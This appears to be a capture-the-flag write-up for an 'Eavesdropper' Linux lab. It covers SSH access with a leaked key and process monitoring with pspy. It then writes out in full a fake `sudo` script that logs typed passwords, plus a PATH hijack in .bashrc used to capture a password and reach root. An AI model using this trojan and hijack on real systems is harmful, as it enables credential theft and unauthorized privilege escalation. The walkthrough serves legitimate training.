# Eavesdropper 

> Listen closely, you might hear a password!

After uncovering user Frank's SSH private key, we're tasked with breaking into the target environment, escalating privileges, and capturing the root flag.

---

## Initial Access

With Frank's SSH private key downloaded, I set the correct permissions and connected to the target:

```bash
chmod 600 id-rsa-1647296932800.id-rsa
ssh -i id-rsa-1647296932800.id-rsa frank@10.113.185.195
```

```
Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-96-generic x86_64)
Last login: Tue Aug 11 09:32:15 2026 from 172.18.0.3
frank@workstation:~$
```

This dropped me into a shell as `frank` on the Ubuntu 20.04.4 target.

---

## Enumeration

First step is confirming who we are and what privileges we have:

```bash
frank@workstation:~$ id
uid=1000(frank) gid=1000(frank) groups=1000(frank),27(sudo)
frank@workstation:~$ pwd
/home/frank
frank@workstation:~$ sudo -l
[sudo] password for frank:
Sorry, try again.
[sudo] password for frank:
sudo: 1 incorrect password attempt
```

Frank is a member of the `sudo` group, meaning he *can* run commands as root but only with his password, which we don't have. So `sudo -l` is a dead end without it.

This points towards monitoring the system for background/cron processes running as root that might leak a password or expose a privilege escalation path.

---

## Transferring pspy to the Target

The target has no outbound internet access, so `pspy64` needs to be pulled down on the attacking machine first, then pushed over via `scp`.

On the attacking machine:

```bash
cd ~/Desktop
wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy64
chmod +x pspy64
scp -i id-rsa-1647296932800.id-rsa pspy64 frank@10.113.185.195:/home/frank/
```

Back on the target, confirm the transfer and run it:

```bash
frank@workstation:~$ ls -la
-rwxrwxr-x 1 frank frank 3104768 Aug 11 09:34 pspy64
frank@workstation:~$ chmod +x pspy64
frank@workstation:~$ ./pspy64
```

---

## Process Monitoring with pspy

Letting `pspy64` run for a short while while a new SSH login occurs reveals the target process:

```
2026/08/11 09:36:02 CMD: UID=0     PID=2796   | sudo cat /etc/shadow
```

This is **root (UID=0)** running `sudo cat /etc/shadow` — and critically, calling `sudo` **without specifying its full path** (`/usr/bin/sudo`). This fires around SSH login time, matching the `sshd: frank@pts/1` entries just before it.

---

## Building the Malicious `sudo` Binary

```bash
frank@workstation:~$ cd /tmp
frank@workstation:/tmp$ nano sudo
```

Contents of the fake `sudo` script:

```bash
#!/usr/bin/bash

read -sp 'Password: ' Password   
echo $Password > /tmp/passwd.txt 
```

Make it executable:

```bash
frank@workstation:/tmp$ chmod +x sudo
```

---

## Hijacking the PATH

```bash
frank@workstation:/tmp$ export PATH=/tmp:$PATH
frank@workstation:/tmp$ echo $PATH
/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
```

With `/tmp` prepended, any unqualified call to `sudo` in this shell now resolves to our fake binary first.


```bash
frank@workstation:~$ nano ~/.bashrc
```

Added to the top of the file:

```bash
PATH=/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
```

Confirmed the change:

```bash
frank@workstation:~$ pwd
/home/frank
frank@workstation:~$ cat ~/.bashrc | grep PATH
PATH=/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
```

> **Note:** Make sure you're editing `~/.bashrc` (i.e. `/home/frank/.bashrc`) and not accidentally creating a stray `.bashrc` inside `/tmp` — double-check with `pwd` before editing.

---

## Capturing the Password

Logging out and back in spawns a fresh shell, sourcing the modified `.bashrc` and putting `/tmp` first in `$PATH`. This causes the root-owned process to unknowingly execute the fake `sudo` in `/tmp`, capturing Frank's password when it prompts:

```bash
frank@workstation:~$ exit
```

```bash
$ ssh -i id-rsa-1647296932800.id-rsa frank@10.113.185.195
...
frank@workstation:~$ ls /tmp
passwd.txt  sudo
frank@workstation:~$ cat /tmp/passwd.txt
!@#frankisawesome2022%*
```

Boom!

---

## Escalating to Root

Since `sudo` itself has been hijacked in `$PATH`, the real binary must be called explicitly by full path — otherwise we'd just trigger our own fake script again.

```bash
frank@workstation:~$ /usr/bin/sudo su
[sudo] password for frank:
root@workstation:/home/frank#
```

And we're root. Grab the flag:

```bash
root@workstation:/home/frank# cd
root@workstation:~# ls
flag.txt
root@workstation:~# cat flag.txt
flag{14370304172628f784d8e8962d54a600}
```
